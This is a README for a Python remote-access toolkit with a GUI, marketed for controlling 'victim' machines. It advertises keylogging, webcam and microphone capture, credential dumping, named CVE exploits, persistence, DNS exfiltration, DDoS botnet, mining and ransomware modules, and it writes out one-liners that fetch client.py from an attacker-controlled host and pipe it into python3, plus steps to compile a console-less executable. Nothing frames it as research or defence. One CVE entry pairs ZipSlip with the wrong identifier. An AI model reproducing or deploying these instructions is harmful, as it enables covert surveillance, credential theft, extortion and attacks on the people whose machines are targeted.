```
# REVERSESHELL

The ultimate encrypted reverse shell toolkit with a beautiful GUI for controlling remote machines.

## Features

### Core
- AES-256 Encrypted communication
- Modern Dark UI with real-time terminal
- Multi-client support
- File Upload/Download
- Process Listing
- System Information gathering
- Python-based - runs everywhere

### Surveillance Modules
- Screenshot Capture - Real-time screenshots with daemon support
- Keylogger - Full keylogging with configurable intervals
- Webcam Access - Capture photos and video from victim webcam
- Microphone Recording - Record audio from victim microphone
- Screen Recording - Full screen video recording
- Clipboard Monitoring - Steal clipboard contents
- Notification Monitoring - Desktop notifications and active windows

### Reconnaissance Modules
- Geolocation - IP-based, WiFi-based, and GPS geolocation
- Network Sniffer - Packet capture and traffic analysis
- Credential Dumping - Mimikatz-style, browser passwords, WiFi, SSH keys
- Email Harvesting - Thunderbird, Outlook, Apple Mail
- Database Dumping - SQLite, MySQL, PostgreSQL

### Exploitation Modules
- CVE Exploits - MS17-010, BlueKeep, Log4Shell, Follina, ZipSlip
- Privilege Escalation - Sudo, SUID, capabilities, services
- Lateral Movement - SSH, SMB, RDP, PsExec, WMI, WinRM
- Vulnerability Scanning - Network and service enumeration

### Persistence Modules
- Cron, Registry, Systemd, LaunchAgents
- Scheduled Tasks
- Startup Folders

### Exfiltration Modules
- DNS Tunneling - Exfiltrate data via DNS queries
- Dead Drops - File exchange between clients
- Proxy Support - HTTP, SOCKS4/5, ProxyChains

### Advanced Modules
- Beaconing - Scheduled check-ins with jitter
- Botnet Features - DDoS, crypto mining, spam relay
- Ransomware - File encryption with ransom notes
- Polymorphic Payloads - Generate unique, obfuscated payloads
- Port Forwarding - SOCKS proxy through victim
- Database Dumping - Auto-detect and export databases

## CVE Exploits Included
| CVE | Name | Description |
|-----|------|-------------|
| MS17-010 | EternalBlue | SMBv1 Remote Code Execution |
| CVE-2019-0708 | BlueKeep | RDP Remote Code Execution |
| CVE-2021-44228 | Log4Shell | Log4j JNDI Injection |
| CVE-2022-30190 | Follina | MSDT Remote Code Execution |
| CVE-2024-6387 | ZipSlip | Archive Extraction Vulnerability |

## Installation

bash
cd ~/Desktop/REVERSESHELL

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

## Quick Start

### 1. Start the Server (Your Machine)

bash
python3 server.py

Click "Start Server" in the GUI.

### 2. Run the Client (Victim Machine)

bash
# Basic usage
python3 client.py

# Connect to specific server
python3 client.py YOUR_IP 9999

### 3. Control the Client

- Select a client from the left panel
- Use module buttons for advanced features
- Type commands in the terminal input

## Module Usage

All modules are accessible via GUI buttons:

### Surveillance
- Screenshot - Capture victim screen
- Keylogger - Start keylogging
- Webcam - Capture webcam photo
- Mic - Record 10 seconds of audio
- ScreenRec - Record 30 seconds of video
- Clipboard - Get clipboard content

### Reconnaissance
- Creds - Dump all credentials
- Privesc - Scan for privilege escalation
- Sniffer - Capture network packets
- Email - Harvest emails from mail clients
- Database - Dump all databases

### Exploitation
- Scan - Vulnerability scan target
- Lateral - Enumerate network for lateral movement
- Persist - Install persistence

### Exfiltration
- Geo - Get geolocation data
- Proxy - Test proxy configuration
- DeadDrop - List dead drops
- DNS Tunnel - Send data via DNS

### Advanced
- Beacon - Start beaconing to C2
- Botnet - Start DDoS attack
- Ransom - Encrypt victim files
- Poly Payload - Generate polymorphic payload

## One-Liner Payloads

bash
# Python (stealthy)
curl -s http://YOUR_IP/client.py | python3 - YOUR_IP 9999

# Download and run
wget http://YOUR_IP/client.py && python3 client.py YOUR_IP 9999

# Generate with payload.py
python3 payload.py one-liner 192.168.1.100
python3 payload.py embedded > payload.py

## Network Setup

### Find your IP
bash
# Linux/Mac
ifconfig | grep "inet "

# Windows
ipconfig

### Use ngrok for public access
bash
ngrok tcp 9999

## Configuration

Edit config.py to customize settings.

## Compile to Executable

bash
# Install PyInstaller
pip install pyinstaller

# Create standalone executable
pyinstaller --onefile --noconsole client.py

## Testing

bash
# Run quick test
python3 test.py

# Test locally
# Terminal 1: python3 server.py
# Terminal 2: python3 client.py 127.0.0.1 9999

## License

MIT License - Use at your own risk!

---

Made with Python
```
